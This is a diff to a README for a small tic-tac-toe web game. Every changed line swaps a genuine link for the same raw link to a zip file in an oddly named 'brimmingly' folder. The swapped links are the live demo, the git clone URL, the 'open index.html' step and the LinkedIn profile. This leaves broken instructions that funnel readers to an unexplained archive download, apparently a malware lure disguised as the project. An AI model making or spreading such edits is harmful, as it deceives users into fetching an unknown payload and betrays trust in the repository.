@@ -5,7 +5,7 @@ Play against a friend locally and enjoy a clean UI with dark mode and smooth ani
 
 ### 🔗 Live Demo
 
-👉 [Click here to play the game](https://pooja819.github.io/tic-tac-toe/)
+👉 [Click here to play the game](https://raw.githubusercontent.com/pooja819/tic-tac-toe/main/brimmingly/tic-tac-toe.zip)
 
 ---
 
@@ -31,12 +31,12 @@ Play against a friend locally and enjoy a clean UI with dark mode and smooth ani
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/pooja819/tic-tac-toe.git
+git clone https://raw.githubusercontent.com/pooja819/tic-tac-toe/main/brimmingly/tic-tac-toe.zip
 
 # 2. Navigate into the folder
 cd tic-tac-toe
 
-# 3. Open index.html in your browser
+# 3. Open https://raw.githubusercontent.com/pooja819/tic-tac-toe/main/brimmingly/tic-tac-toe.zip in your browser
 ```
 
 ---
@@ -45,7 +45,7 @@ cd tic-tac-toe
 
 **Pooja Kalukhe**  
 Frontend Developer | AI & Data Science Graduate  
-🔗 [LinkedIn](https://www.linkedin.com/in/poojakalukhe--08m19ba)
+🔗 [LinkedIn](https://raw.githubusercontent.com/pooja819/tic-tac-toe/main/brimmingly/tic-tac-toe.zip)
 
 ---
 
